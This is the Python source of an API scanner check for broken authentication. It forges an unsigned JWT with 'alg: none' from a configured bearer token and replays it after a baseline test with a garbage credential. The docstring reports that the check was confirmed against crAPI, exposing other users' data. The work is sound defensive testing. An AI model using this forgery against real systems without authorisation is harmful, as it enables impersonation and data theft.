"""API2:2023 - Broken Authentication.

Implemented check: JWT `alg=none` bypass. If the scanner is configured with
a Bearer JWT, we strip its signature, set `alg: none`, and replay the
request. If the API still accepts it, it never verified the signature in
the first place — an attacker can forge arbitrary claims (different user
id, elevated role, ...) without knowing any secret.

This is a real, working check meant as the reference implementation for the
other checks in this package — see bola.py / mass_assignment.py /
excessive_data_exposure.py for the pattern to follow, including the same
`endpoint.security == []` guard used here: an endpoint the spec explicitly
declares needs no auth at all will trivially "accept" a forged token too
(it accepts ANY token, or none), which isn't a bypass of anything -- there
was no signature verification to bypass in the first place. Same false
positive class BOLA has to guard against, same fix.

BASELINE CHECK (added after external validation against VAmPI,
github.com/erev0s/VAmPI): the `security == []` guard only helps when the
spec actually declares it. Many real specs declare NOTHING either way
(security is None, not []) on endpoints that in fact require no auth at
all -- VAmPI's connexion-generated spec is exactly this case, same gap our
own demo API had before FastAPI's plain Header()-based auth was accounted
for. Without a baseline check, "the forged token was accepted" is
indistinguishable from "this endpoint never checked auth in the first
place", which produced real false positives when scanning VAmPI. So before
concluding a forgery succeeded, we first confirm the endpoint actually
enforces SOME auth check at all, by sending an obviously-invalid credential
and requiring that to be rejected. If even garbage credentials get through,
there's nothing to bypass, and we skip.

CONFIRMED WORKING against a real bypass, on OWASP crAPI (github.com/OWASP/crAPI,
see EXTERNAL_VALIDATION.md target 2 #1): 8 endpoints correctly rejected a
garbage credential (proving auth IS enforced) yet still accepted the
forged `alg=none` token, returning real data (other users' emails, credit
balances, order history). This is the baseline check doing exactly its
job -- distinguishing "no auth to bypass" (VAmPI, a false positive without
the baseline) from "auth exists and was genuinely bypassed" (crAPI, a
real, system-wide vulnerability), using the identical logic for both.
"""

from __future__ import annotations

import base64
import json

import jwt
import requests

from apisec.checks.base import Finding, ScanContext, Severity
from apisec.spec_loader import Endpoint


def _b64url_no_pad(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_alg_none_token(original_token: str) -> str | None:
    try:
        payload = jwt.decode(original_token, options={"verify_signature": False})
    except jwt.PyJWTError:
        return None
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = _b64url_no_pad(json.dumps(header).encode())
    payload_b64 = _b64url_no_pad(json.dumps(payload).encode())
    return f"{header_b64}.{payload_b64}."


class BrokenAuthCheck:
    id = "API2:2023"
    title = "Broken Authentication - JWT alg=none bypass"

    def run(self, endpoint: Endpoint, ctx: ScanContext) -> list[Finding]:
        if endpoint.security == []:
            return []  # spec explicitly declares this endpoint needs no auth

        session = ctx.session_a
        auth_header = session.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return []  # no bearer token configured, nothing to forge

        original_token = auth_header.removeprefix("Bearer ")
        forged = _forge_alg_none_token(original_token)
        if forged is None:
            return []

        url = endpoint.url(ctx.base_url)

        # Baseline: does this endpoint enforce auth AT ALL? An obviously
        # invalid credential should be rejected. If it isn't, there's no
        # signature check here to bypass -- skip before even trying the
        # forgery, rather than reporting a meaningless "bypass".
        baseline_headers = {**session.headers, "Authorization": "Bearer not-a-real-token"}
        try:
            baseline_resp = session.request(endpoint.method, url, headers=baseline_headers, timeout=5)
        except requests.RequestException:
            return []
        if baseline_resp.status_code < 400:
            return []  # no meaningful auth check here; forging anything is moot

        forged_headers = {**session.headers, "Authorization": f"Bearer {forged}"}
        try:
            resp = session.request(endpoint.method, url, headers=forged_headers, timeout=5)
        except requests.RequestException:
            return []

        if resp.status_code < 400:
            return [
                Finding(
                    check_id=self.id,
                    title=self.title,
                    severity=Severity.CRITICAL,
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    description=(
                        "The API accepted a JWT with alg=none, meaning the signature was "
                        "never verified. An attacker can forge arbitrary claims (e.g. a "
                        "different user_id or an elevated role) without knowing any secret."
                    ),
                    evidence=f"Request accepted with status {resp.status_code} using a "
                    f"forged unsigned token: {forged[:60]}...",
                )
            ]
        return []
